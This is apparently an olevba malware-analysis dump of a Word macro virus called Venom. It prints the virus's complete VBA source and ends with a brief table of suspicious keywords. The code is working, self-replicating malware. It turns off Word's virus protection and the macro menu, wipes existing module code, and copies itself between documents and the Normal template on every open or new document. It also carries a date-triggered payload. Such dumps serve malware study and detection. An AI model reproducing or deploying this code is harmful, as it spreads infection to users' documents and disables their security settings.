olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Venom-33cc7c4372077b7253e75833a5a2502dbd5d5496
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Venom7.cls 
in file: Virus.MSWord.Venom-33cc7c4372077b7253e75833a5a2502dbd5d5496 - OLE stream: 'Macros/VBA/Venom7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_New()
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2

If ADI1.Name <> "Venom7" Then
    If ADCL > 0 Then
        Dim f As Long
        For f = 1 To ADCL
            On Error Resume Next
            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines f, 1
        Next f
        ADI1.Name = "Venom7"
        DoAD = True
    Else
        ADI1.Name = "Venom7"
        DoAD = True
    End If
End If

If NTI1.Name <> "Venom7" Then
    If NTCL > 0 Then
        Dim i As Long
        For i = 1 To NTCL
            On Error Resume Next
            NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
        Next i
        NTI1.Name = "Venom7"
        DoNT = True
    Else
        NTI1.Name = "Venom7"
        DoNT = True
    End If
End If
If DoNT <> True And DoAD <> True Then GoTo CYA

If DoAD = True Then
    For hunger = NTCL To 1 Step -1
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
    docname = Left$(ActiveDocument.Name, 8)
    If docname <> "Document" Then
    ActiveDocument.Save
    End If
End If

If DoNT = True Then
    For hunger = ADCL To 1 Step -1
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
End If



CYA:
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."

End Sub

Private Sub Document_Open()

CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2

If ADI1.Name <> "Venom7" Then
    If ADCL > 0 Then
        Dim f As Long
        For f = 1 To ADCL
            On Error Resume Next
            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines f, 1
        Next f
        ADI1.Name = "Venom7"
        DoAD = True
    Else
        ADI1.Name = "Venom7"
        DoAD = True
    End If
End If

If NTI1.Name <> "Venom7" Then
    If NTCL > 0 Then
        Dim i As Long
        For i = 1 To NTCL
            On Error Resume Next
            NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines i, 1
        Next i
        NTI1.Name = "Venom7"
        DoNT = True
    Else
        NTI1.Name = "Venom7"
        DoNT = True
    End If
End If
If DoNT <> True And DoAD <> True Then GoTo CYA

If DoAD = True Then
    For hunger = NTCL To 1 Step -1
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
    ActiveDocument.Save
End If

If DoNT = True Then
    For hunger = ADCL To 1 Step -1
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(hunger, 1)
    Next hunger
End If



CYA:
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

